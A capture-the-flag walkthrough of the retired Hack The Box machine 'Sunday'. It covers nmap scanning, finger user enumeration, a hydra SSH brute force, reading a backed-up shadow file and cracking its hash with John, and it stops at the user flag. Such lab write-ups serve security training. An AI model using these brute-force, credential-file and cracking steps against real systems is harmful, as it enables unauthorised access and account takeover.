<!-- Fix MathJax rendering on iOS Safari due to rendering long numbers as phone numbers. -->




<!doctype html>
<html lang="en" class="no-js">
  <head>
    
	
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      
        <meta name="description" content="A compilation of writeups for the website- [**https://www.hackthebox.eu/](https://www.hackthebox.eu/**).">
      
      
        <link rel="canonical" href="http://hackthebox-solutions.github.io/Retired/Sunday Writeup wo Metasploit/">
      
      
        <meta name="author" content="Rushi Chaudhari">
      
      
        <meta name="lang:clipboard.copy" content="Copy to clipboard">
      
        <meta name="lang:clipboard.copied" content="Copied to clipboard">
      
        <meta name="lang:search.language" content="en">
      
        <meta name="lang:search.pipeline.stopwords" content="True">
      
        <meta name="lang:search.pipeline.trimmer" content="True">
      
        <meta name="lang:search.result.none" content="No matching documents">
      
        <meta name="lang:search.result.one" content="1 matching document">
      
        <meta name="lang:search.result.other" content="# matching documents">
      
        <meta name="lang:search.tokenizer" content="[\s\-]+">
      
      <link rel="shortcut icon" href="../../assets/favicon.png">
      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
    
	<meta name="format-detection" content="telephone=no">

    
      
        <title>27. Sunday Writeup w/o Metasploit.md - Hackthebox Solutions</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/application.1b62728e.css">
      
        <link rel="stylesheet" href="../../assets/stylesheets/application-palette.a8b3c06d.css">
      
      
        
        
        <meta name="theme-color" content="#009688">
      
    
    
      <script src="../../assets/javascripts/modernizr.268332fc.js"></script>
    
    
      
        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
      
    
    <link rel="stylesheet" href="../../assets/fonts/material-icons.css">
    
    
      <link rel="stylesheet" href="../../css/katex.css">
    
      <link rel="stylesheet" href="../../css/custom.css">
    
      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.css">
    
    
      
    
    
  </head>
  
    
    
    <body dir="ltr" data-md-color-primary="teal" data-md-color-accent="blue">
  
    <svg class="md-svg">
      <defs>
        
        
          <svg xmlns="http://www.w3.org/2000/svg" width="416" height="448" viewBox="0 0 416 448" id="__github"><path fill="currentColor" d="M160 304q0 10-3.125 20.5t-10.75 19T128 352t-18.125-8.5-10.75-19T96 304t3.125-20.5 10.75-19T128 256t18.125 8.5 10.75 19T160 304zm160 0q0 10-3.125 20.5t-10.75 19T288 352t-18.125-8.5-10.75-19T256 304t3.125-20.5 10.75-19T288 256t18.125 8.5 10.75 19T320 304zm40 0q0-30-17.25-51T296 232q-10.25 0-48.75 5.25Q229.5 240 208 240t-39.25-2.75Q130.75 232 120 232q-29.5 0-46.75 21T56 304q0 22 8 38.375t20.25 25.75 30.5 15 35 7.375 37.25 1.75h42q20.5 0 37.25-1.75t35-7.375 30.5-15 20.25-25.75T360 304zm56-44q0 51.75-15.25 82.75-9.5 19.25-26.375 33.25t-35.25 21.5-42.5 11.875-42.875 5.5T212 416q-19.5 0-35.5-.75t-36.875-3.125-38.125-7.5-34.25-12.875T37 371.5t-21.5-28.75Q0 312 0 260q0-59.25 34-99-6.75-20.5-6.75-42.5 0-29 12.75-54.5 27 0 47.5 9.875t47.25 30.875Q171.5 96 212 96q37 0 70 8 26.25-20.5 46.75-30.25T376 64q12.75 25.5 12.75 54.5 0 21.75-6.75 42 34 40 34 99.5z"/></svg>
        
      </defs>
    </svg>
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
    
      <a href="#reconnaissance" tabindex="1" class="md-skip">
        Skip to content
      </a>
    
    
      <header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid">
    <div class="md-flex">
      <div class="md-flex__cell md-flex__cell--shrink">
        <a href="http://hackthebox-solutions.github.io" title="Hackthebox Solutions" class="md-header-nav__button md-logo">
          
            <i class="md-icon"></i>
          
        </a>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
      </div>
      <div class="md-flex__cell md-flex__cell--stretch">
        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
          
            <span class="md-header-nav__topic">
              Hackthebox Solutions
            </span>
            <span class="md-header-nav__topic">
              
                27. Sunday Writeup w/o Metasploit.md
              
            </span>
          
        </div>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        
          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
          
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
      <label class="md-icon md-search__icon" for="__search"></label>
      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
        &#xE5CD;
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="result">
          <div class="md-search-result__meta">
            Type to start searching
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
        
      </div>
      
        <div class="md-flex__cell md-flex__cell--shrink">
          <div class="md-header-nav__source">
            


  

<a href="https://github.com/hackthebox-solutions/hackthebox-solutions.github.io/" title="Go to repository" class="md-source" data-md-source="github">
  
    <div class="md-source__icon">
      <svg viewBox="0 0 24 24" width="24" height="24">
        <use xlink:href="#__github" width="24" height="24"></use>
      </svg>
    </div>
  
  <div class="md-source__repository">
    hackthebox-solutions.github.io
  </div>
</a>
          </div>
        </div>
      
    </div>
  </nav>
</header>
    
    <div class="md-container">
      
        
      
      
      <main class="md-main" role="main">
        <div class="md-main__inner md-grid" data-md-component="container">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    <nav class="md-nav md-nav--primary" data-md-level="0">
  <label class="md-nav__title md-nav__title--site" for="__drawer">
    <a href="http://hackthebox-solutions.github.io" title="Hackthebox Solutions" class="md-nav__button md-logo">
      
        <i class="md-icon"></i>
      
    </a>
    Hackthebox Solutions
  </label>
  
    <div class="md-nav__source">
      


  

<a href="https://github.com/hackthebox-solutions/hackthebox-solutions.github.io/" title="Go to repository" class="md-source" data-md-source="github">
  
    <div class="md-source__icon">
      <svg viewBox="0 0 24 24" width="24" height="24">
        <use xlink:href="#__github" width="24" height="24"></use>
      </svg>
    </div>
  
  <div class="md-source__repository">
    hackthebox-solutions.github.io
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  <li class="md-nav__item">
    <a href="../.." title="Preface" class="md-nav__link">
      Preface
    </a>
  </li>

    
      
      
      

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" checked>
    
    <label class="md-nav__link" for="nav-2">
      I Retired
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-2">
        I Retired
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../Access Writeup/" title="1. Access Writeup.md" class="md-nav__link">
      1. Access Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Jerry Writeup/" title="2. Jerry Writeup.md" class="md-nav__link">
      2. Jerry Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Blue Writeup wo Metasploit/" title="3. Blue Writeup w/o Metasploit.md" class="md-nav__link">
      3. Blue Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Blocky Writeup/" title="4. Blocky Writeup.md" class="md-nav__link">
      4. Blocky Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Calamity Writeup/" title="5. Calamity Writeup.md" class="md-nav__link">
      5. Calamity Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Devoops Writeup/" title="6. Devoops Writeup.md" class="md-nav__link">
      6. Devoops Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Apocalyst Writeup/" title="7. Apocalyst Writeup.md" class="md-nav__link">
      7. Apocalyst Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Poison Writeup wo Metasploit/" title="8. Poison Writeup w/o Metasploit.md" class="md-nav__link">
      8. Poison Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Postman Writeup/" title="9. Postman Writeup.md" class="md-nav__link">
      9. Postman Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Beep Writeup/" title="10. Beep Writeup.md" class="md-nav__link">
      10. Beep Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Help Writeup/" title="11. Help Writeup.md" class="md-nav__link">
      11. Help Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Mirai Writeup/" title="12. Mirai Writeup.md" class="md-nav__link">
      12. Mirai Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Curling Writeup/" title="13. Curling Writeup.md" class="md-nav__link">
      13. Curling Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Nibbles Writeup wo Metasploit/" title="14. Nibbles Writeup w/o Metasploit.md" class="md-nav__link">
      14. Nibbles Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Valentine Writeup wo Metasploit/" title="15. Valentine Writeup w/o Metasploit.md" class="md-nav__link">
      15. Valentine Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Popcorn Writeups/" title="16. Popcorn Writeups.md" class="md-nav__link">
      16. Popcorn Writeups.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Cronos Writeup/" title="17. Cronos Writeup.md" class="md-nav__link">
      17. Cronos Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Legacy Writeup/" title="18. Legacy Writeup.md" class="md-nav__link">
      18. Legacy Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Openadmin Writeup/" title="19. Openadmin Writeup.md" class="md-nav__link">
      19. Openadmin Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Bank Writeup/" title="20. Bank Writeup.md" class="md-nav__link">
      20. Bank Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Shocker Writeup wo Metasploit/" title="21. Shocker Writeup w/o Metasploit.md" class="md-nav__link">
      21. Shocker Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Luke Writeup/" title="22. Luke Writeup.md" class="md-nav__link">
      22. Luke Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Arctic Writeup wo Metasploit/" title="23. Arctic Writeup w/o Metasploit.md" class="md-nav__link">
      23. Arctic Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Granny Writeup/" title="24. Granny Writeup.md" class="md-nav__link">
      24. Granny Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Netmon Writeup/" title="25. Netmon Writeup.md" class="md-nav__link">
      25. Netmon Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Sense Writeup wo Metasploit/" title="26. Sense Writeup w/o Metasploit.md" class="md-nav__link">
      26. Sense Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          

  


  <li class="md-nav__item md-nav__item--active">
    
    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
    
      
    
    
    <a href="./" title="27. Sunday Writeup w/o Metasploit.md" class="md-nav__link md-nav__link--active">
      27. Sunday Writeup w/o Metasploit.md
    </a>
    
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Solidstate Writeup wo Metasploit/" title="28. Solidstate Writeup w/o Metasploit.md" class="md-nav__link">
      28. Solidstate Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Celestial Writeup/" title="29. Celestial Writeup.md" class="md-nav__link">
      29. Celestial Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Tenten Writeup/" title="30. Tenten Writeup.md" class="md-nav__link">
      30. Tenten Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Optimum Writeup/" title="31. Optimum Writeup.md" class="md-nav__link">
      31. Optimum Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Haircut Writeup/" title="32. Haircut Writeup.md" class="md-nav__link">
      32. Haircut Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Irked Writeup/" title="33. Irked Writeup.md" class="md-nav__link">
      33. Irked Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Chatterbox Writeup wo Metasploit/" title="34. Chatterbox Writeup w/o Metasploit.md" class="md-nav__link">
      34. Chatterbox Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Bashed Writeup/" title="35. Bashed Writeup.md" class="md-nav__link">
      35. Bashed Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Lame Writeup/" title="36. Lame Writeup.md" class="md-nav__link">
      36. Lame Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Grandpa Writeup/" title="37. Grandpa Writeup.md" class="md-nav__link">
      37. Grandpa Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Swagshop Writeup/" title="38. Swagshop Writeup.md" class="md-nav__link">
      38. Swagshop Writeup.md
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary">
  
  
    
  
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                  <a href="https://github.com/hackthebox-solutions/hackthebox-solutions.github.io/edit/master/docs/Retired/Sunday Writeup wo Metasploit.md" title="Edit this page" class="md-icon md-content__icon">&#xE3C9;</a>
                
                
                <p><img alt="" src="../../img/Sunday Writeup wo Metasploit/1_5y8ktvN6Xf0lIABNdgs09Q.png" /></p>
<p>This is the 22nd blog out of a series of blogs I will be publishing on retired HTB machines in preparation for the OSCP. The full list of OSCP like machines compiled by <a href="https://twitter.com/TJ_Null">TJ_Null</a> can be found <a href="https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#">here</a>.</p>
<p>Let’s get started!</p>
<h1 id="reconnaissance">Reconnaissance</h1>
<p>First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>nmap -sC -sV -O -oA initial 10.10.10.76
</pre></div>

<ul>
<li>
<p><strong>-sC</strong>: run default nmap scripts</p>
</li>
<li>
<p><strong>-sV</strong>: detect service version</p>
</li>
<li>
<p><strong>-O</strong>: detect OS</p>
</li>
<li>
<p><strong>-oA</strong>: output all formats and store in file <em>initial</em></p>
</li>
</ul>
<p>We get back the following result showing that 2 ports are open:</p>
<ul>
<li>
<p><strong>Port 79: </strong>running Sun Solaris fingerd</p>
</li>
<li>
<p><strong>Port 111: </strong>running rpcbind</p>
</li>
</ul>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos=" 1 "></span>Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-01-05 12:09 EST
<span class="lineno" data-linenos=" 2 "></span>Nmap scan report for 10.10.10.76
<span class="lineno" data-linenos=" 3 "></span>Host is up (0.042s latency).
<span class="lineno" data-linenos=" 4 "></span>Not shown: 996 closed ports
<span class="lineno" data-linenos=" 5 "></span>PORT      STATE    SERVICE   VERSION
<span class="lineno" data-linenos=" 6 "></span>79/tcp    open     finger    Sun Solaris fingerd
<span class="lineno" data-linenos=" 7 "></span>|_finger: No one logged on\x0D
<span class="lineno" data-linenos=" 8 "></span>111/tcp   open     rpcbind   2-4 (RPC #100000)
<span class="lineno" data-linenos=" 9 "></span>10082/tcp filtered amandaidx
<span class="lineno" data-linenos="10 "></span>54328/tcp filtered unknown
<span class="lineno" data-linenos="11 "></span>No exact OS matches for host (If you know what OS is running on it, see [https://nmap.org/submit/](https://nmap.org/submit/) ).
<span class="lineno" data-linenos="12 "></span>TCP/IP fingerprint:
<span class="lineno" data-linenos="13 "></span>....
<span class="lineno" data-linenos="14 "></span>
<span class="lineno" data-linenos="15 "></span>Network Distance: 2 hops
<span class="lineno" data-linenos="16 "></span>Service Info: OS: Solaris; CPE: cpe:/o:sun:sunos
<span class="lineno" data-linenos="17 "></span>
<span class="lineno" data-linenos="18 "></span>OS and Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .
<span class="lineno" data-linenos="19 "></span>Nmap done: 1 IP address (1 host up) scanned in 151.04 seconds
</pre></div>

<p>Before we start investigating these ports, let’s run more comprehensive nmap scans in the background to make sure we cover all bases.</p>
<p>Let’s run an nmap scan that covers all ports. Since the full nmap scan takes too long to run, let’s first run a quick scan to figure out which ports are open.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>nmap -p- -oA full-noscripts 10.10.10.76  --max-retries 0
</pre></div>

<ul>
<li><strong>— max-retries:</strong> number of port scan probe retransmissions</li>
</ul>
<p>We get back the following result showing that two other ports are open.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos=" 1 "></span>Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-01-05 17:49 EST
<span class="lineno" data-linenos=" 2 "></span>Warning: 10.10.10.76 giving up on port because retransmission cap hit (0).
<span class="lineno" data-linenos=" 3 "></span>Nmap scan report for 10.10.10.76
<span class="lineno" data-linenos=" 4 "></span>Host is up (0.039s latency).
<span class="lineno" data-linenos=" 5 "></span>Not shown: 63933 filtered ports, 1598 closed ports
<span class="lineno" data-linenos=" 6 "></span>PORT      STATE SERVICE
<span class="lineno" data-linenos=" 7 "></span>79/tcp    open  finger
<span class="lineno" data-linenos=" 8 "></span>111/tcp   open  rpcbind
<span class="lineno" data-linenos=" 9 "></span>22022/tcp open  unknown
<span class="lineno" data-linenos="10 "></span>55029/tcp open  unknown
</pre></div>

<p>Then we run a more comprehensive scan to identify services running on the above ports.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>nmap -p 79,111,22022,55029 -sV -oA full-scripts 10.10.10.7
</pre></div>

<p>We get back the following result showing that:</p>
<ul>
<li>
<p><strong>Port 22022:</strong> is running SunSSH 1.3</p>
</li>
<li>
<p><strong>Port 55029: </strong>is running a service that nmap was not able to identify</p>
</li>
</ul>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos=" 1 "></span>Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-01-05 17:52 EST
<span class="lineno" data-linenos=" 2 "></span>Nmap scan report for 10.10.10.76
<span class="lineno" data-linenos=" 3 "></span>Host is up (0.037s latency).
<span class="lineno" data-linenos=" 4 "></span>
<span class="lineno" data-linenos=" 5 "></span>PORT      STATE SERVICE VERSION
<span class="lineno" data-linenos=" 6 "></span>79/tcp    open  finger  Sun Solaris fingerd
<span class="lineno" data-linenos=" 7 "></span>|_finger: ERROR: Script execution failed (use -d to debug)
<span class="lineno" data-linenos=" 8 "></span>111/tcp   open  rpcbind
<span class="lineno" data-linenos=" 9 "></span>22022/tcp open  ssh     SunSSH 1.3 (protocol 2.0)
<span class="lineno" data-linenos="10 "></span>| ssh-hostkey:
<span class="lineno" data-linenos="11 "></span>|   1024 d2:e5:cb:bd:33:c7:01:31:0b:3c:63:d9:82:d9:f1:4e (DSA)
<span class="lineno" data-linenos="12 "></span>|_  1024 e4:2c:80:62:cf:15:17:79:ff:72:9d:df:8b:a6:c9:ac (RSA)
<span class="lineno" data-linenos="13 "></span>55029/tcp open  unknown
<span class="lineno" data-linenos="14 "></span>Service Info: OS: Solaris; CPE: cpe:/o:sun:sunos
<span class="lineno" data-linenos="15 "></span>
<span class="lineno" data-linenos="16 "></span>Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .
<span class="lineno" data-linenos="17 "></span>Nmap done: 1 IP address (1 host up) scanned in 31.37 seconds
</pre></div>

<p>Since the UDP scan took too long to run, we don’t have UDP scan results for this blog.</p>
<h1 id="enumeration">Enumeration</h1>
<p>We’ll start off with enumerating port 79. A quick google search on the “Finger service” tells us that the finger protocol is used to find out information about users on a remote system. Therefore, we can use it to enumerate usernames.</p>
<p>First, check if there are any logged in users.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>root@kali:~# finger [@10](http://twitter.com/10).10.10.76
<span class="lineno" data-linenos="2 "></span>No one logged on
</pre></div>

<p>No one is currently logged in. Let’s check if the user “root” exists.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>root@kali:~# finger root@10.10.10.76
<span class="lineno" data-linenos="2 "></span>Login       Name               TTY         Idle    When    Where
<span class="lineno" data-linenos="3 "></span>root     Super-User            pts/3        &lt;Apr 24, 2018&gt; sunday
</pre></div>

<p>It does exist. Now, let’s enumerate more usernames. The <a href="https://installlion.com/kali/kali/main/s/seclists/install/index.html">seclists</a> project has a list of usernames that we can use in order to guess the usernames that are available on the server.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>/usr/share/seclists/Usernames/Names/names.txt
</pre></div>

<p>Pentestmonkey has a <a href="http://pentestmonkey.net/tools/user-enumeration/finger-user-enum">finger-user-enum</a> script that is used to enumerate OS-level user accounts via the finger service. Let’s run that on our host.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.76
</pre></div>

<ul>
<li>
<p><strong>-U: </strong>file of usernames to check via finger service</p>
</li>
<li>
<p><strong>-t:</strong> server host running finger service</p>
</li>
</ul>
<p>We get the following result showing us that “sammy” and “sunday” are users of the system.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>....
<span class="lineno" data-linenos="2 "></span>sammy@10.10.10.76: sammy                 pts/2        &lt;Apr 24, 2018&gt; 10.10.14.4          ..
<span class="lineno" data-linenos="3 "></span>sunny@10.10.10.76: sunny                              &lt;Jan  5 23:37&gt; 10.10.14.12         ..
<span class="lineno" data-linenos="4 "></span>....
</pre></div>

<h1 id="initial-foothold">Initial Foothold</h1>
<p>Since SSH is open and we have two valid usernames, let’s try brute-forcing the users’ credentials using hydra. We’ll start off with Sunny.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>hydra -l sunny -P &#39;/usr/share/wordlists/rockyou.txt&#39; 10.10.10.76 ssh -s 22022
</pre></div>

<ul>
<li>
<p><strong>-l:</strong> username</p>
</li>
<li>
<p><strong>-P:</strong> password file</p>
</li>
<li>
<p><strong>-s:</strong> port</p>
</li>
</ul>
<p>We get back the following result showing us that Sunny’s password is “sunday”.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
<span class="lineno" data-linenos="2 "></span>....
<span class="lineno" data-linenos="3 "></span>[22022][ssh] host: 10.10.10.76   login: sunny   password: sunday
<span class="lineno" data-linenos="4 "></span>....
</pre></div>

<p>SSH into Sunny’s account.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>ssh -p 22022 sunny@10.10.10.76
</pre></div>

<p>We get the following error.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>Unable to negotiate with 10.10.10.76 port 22022: no matching key exchange method found. Their offer: gss-group1-sha1-toWM5Slw5Ew8Mqkay+al2g==,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1
</pre></div>

<p>The error tells us that the client and server were unable to agree on the key exchange algorithm. The server offered three legacy algorithms for key exchange. So we’ll have to choose one of these algorithms in order to login.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>ssh -oKexAlgorithms=diffie-hellman-group1-sha1 -p 22022 sunny@10.10.10.76
</pre></div>

<ul>
<li><strong>-oKexAlgorithms: </strong>enable a key exchange algorithm that is disabled by default</li>
</ul>
<p>We’re in! Locate the user.txt flag and try to view it.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>sunny@sunday:~$ find / -name  user.txt 2&gt;/dev/null
<span class="lineno" data-linenos="2 "></span>/export/home/sammy/Desktop/user.txt
<span class="lineno" data-linenos="3 "></span>
<span class="lineno" data-linenos="4 "></span>sunny@sunday:~$ cat /export/home/sammy/Desktop/user.txt
<span class="lineno" data-linenos="5 "></span>cat: /export/home/sammy/Desktop/user.txt: Permission denied
</pre></div>

<p>We need to escalate our privileges to Sammy.</p>
<h1 id="privilege-escalation">Privilege Escalation</h1>
<p>Run the following command to view the list of allowed commands that the user can run with root privileges.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>sunny@sunday:~$ sudo -l
<span class="lineno" data-linenos="2 "></span>User sunny may run the following commands on this host:
<span class="lineno" data-linenos="3 "></span>    (root) NOPASSWD: /root/troll
</pre></div>

<p>We can run the /root/troll command as root. This is obviously a custom command so let’s run it to see what it’s doing (we don’t have read access to it).</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>sunny@sunday:~$ sudo /root/troll
<span class="lineno" data-linenos="2 "></span>testing
<span class="lineno" data-linenos="3 "></span>uid=0(root) gid=0(root)
</pre></div>

<p>It seems to be a script that prints the id of the user running it. Since we ran it with the ‘sudo’ command, it prints the id of root. We don’t have write access to the script, so we can’t escalate our privileges using it.</p>
<p>After a bit of digging, I found a backup file in the following directory.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>/backup
</pre></div>

<p>It contains two files agen22.backup and shadow.backup. The former we don’t have access to, however, we can view the latter.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos=" 1 "></span>sammy@sunday:/backup$ cat shadow.backup
<span class="lineno" data-linenos=" 2 "></span>mysql:NP:::::::
<span class="lineno" data-linenos=" 3 "></span>openldap:*LK*:::::::
<span class="lineno" data-linenos=" 4 "></span>webservd:*LK*:::::::
<span class="lineno" data-linenos=" 5 "></span>postgres:NP:::::::
<span class="lineno" data-linenos=" 6 "></span>svctag:*LK*:6445::::::
<span class="lineno" data-linenos=" 7 "></span>nobody:*LK*:6445::::::
<span class="lineno" data-linenos=" 8 "></span>noaccess:*LK*:6445::::::
<span class="lineno" data-linenos=" 9 "></span>nobody4:*LK*:6445::::::
<span class="lineno" data-linenos="10 "></span>sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
<span class="lineno" data-linenos="11 "></span>sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
</pre></div>

<p>It’s a backup of the shadow file. We already know Sunny’s password so we’re not going to attempt to crack it. Instead, copy Sammy’s password and save it in the file sammy-hash.txt. Then use John to crack the hash.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos=" 1 "></span>root@kali:~# john --wordlist=/usr/share/wordlists/rockyou.txt sammy-hash.txt
<span class="lineno" data-linenos=" 2 "></span>
<span class="lineno" data-linenos=" 3 "></span>Using default input encoding: UTF-8
<span class="lineno" data-linenos=" 4 "></span>Loaded 1 password hash (sha256crypt, crypt(3) $5$ [SHA256 256/256 AVX2 8x])
<span class="lineno" data-linenos=" 5 "></span>Cost 1 (iteration count) is 5000 for all loaded hashes
<span class="lineno" data-linenos=" 6 "></span>Will run 4 OpenMP threads
<span class="lineno" data-linenos=" 7 "></span>Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
<span class="lineno" data-linenos=" 8 "></span>cooldude!        (?)
<span class="lineno" data-linenos=" 9 "></span>1g 0:00:01:17 DONE (2020-01-05 21:03) 0.01292g/s 2648p/s 2648c/s 2648C/s domonique1..bluenote
<span class="lineno" data-linenos="10 "></span>Use the &quot;--show&quot; option to display all of the cracked passwords reliably
<span class="lineno" data-linenos="11 "></span>Session completed
</pre></div>

<p>We got a password! Let’s su into Sammy’s account.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>su - sammy
</pre></div>

<p>Now we can view the user.txt flag.</p>
